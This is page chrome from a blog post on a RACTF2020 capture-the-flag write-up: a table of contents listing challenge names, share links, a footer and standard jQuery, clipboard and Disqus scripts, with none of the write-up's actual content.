+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#C0llide"><span class="toc-number">1.1.</span> <span class="toc-text">C0llide?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%832"><span class="toc-number">1.2.</span> <span class="toc-text">环境2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Quarantine-Hidden-information"><span class="toc-number">1.2.1.</span> <span class="toc-text">Quarantine - Hidden information</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Quarantine"><span class="toc-number">1.2.2.</span> <span class="toc-text">Quarantine</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Getting-admin"><span class="toc-number">1.2.3.</span> <span class="toc-text">Getting admin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Finding-server-information-%E6%9C%AA%E5%81%9A%E5%87%BA"><span class="toc-number">1.2.4.</span> <span class="toc-text">Finding server information(未做出)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%833"><span class="toc-number">1.3.</span> <span class="toc-text">环境3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Entrypoint"><span class="toc-number">1.3.1.</span> <span class="toc-text">Entrypoint</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Baiting"><span class="toc-number">1.3.2.</span> <span class="toc-text">Baiting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Admin-Attack-%E6%9C%AA%E5%81%9A%E5%87%BA"><span class="toc-number">1.3.3.</span> <span class="toc-text">Admin Attack(未做出)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Vandalism-%E6%9C%AA%E5%81%9A%E5%87%BA"><span class="toc-number">1.3.4.</span> <span class="toc-text">Vandalism(未做出)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Insert-witty-name-%E6%9C%AA%E5%81%9A%E5%87%BA"><span class="toc-number">1.3.5.</span> <span class="toc-text">Insert witty name(未做出)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Xtremely-Memorable-Listing"><span class="toc-number">1.3.6.</span> <span class="toc-text">Xtremely Memorable Listing</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-number">2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Discord"><span class="toc-number">2.1.</span> <span class="toc-text">Discord</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#OSINT"><span class="toc-number">3.</span> <span class="toc-text">OSINT</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#RAirways"><span class="toc-number">3.1.</span> <span class="toc-text">RAirways</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Remote-Retreat"><span class="toc-number">3.2.</span> <span class="toc-text">Remote Retreat</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Cryptography"><span class="toc-number">4.</span> <span class="toc-text">Cryptography</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Really-Simple-Algorithm"><span class="toc-number">4.1.</span> <span class="toc-text">Really Simple Algorithm</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0"><span class="toc-number">5.</span> <span class="toc-text">后记</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://crownz-sec.github.io/2020/06/07/RACTF2020/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://crownz-sec.github.io/2020/06/07/RACTF2020/&text=RACTF2020"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://crownz-sec.github.io/2020/06/07/RACTF2020/&title=RACTF2020"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://crownz-sec.github.io/2020/06/07/RACTF2020/&is_video=false&description=RACTF2020"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=RACTF2020&body=Check out this article: https://crownz-sec.github.io/2020/06/07/RACTF2020/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://crownz-sec.github.io/2020/06/07/RACTF2020/&title=RACTF2020"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://crownz-sec.github.io/2020/06/07/RACTF2020/&title=RACTF2020"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://crownz-sec.github.io/2020/06/07/RACTF2020/&title=RACTF2020"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://crownz-sec.github.io/2020/06/07/RACTF2020/&title=RACTF2020"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://crownz-sec.github.io/2020/06/07/RACTF2020/&name=RACTF2020&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://crownz-sec.github.io/2020/06/07/RACTF2020/&t=RACTF2020"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2022
+    crownZ
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'crownZz';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
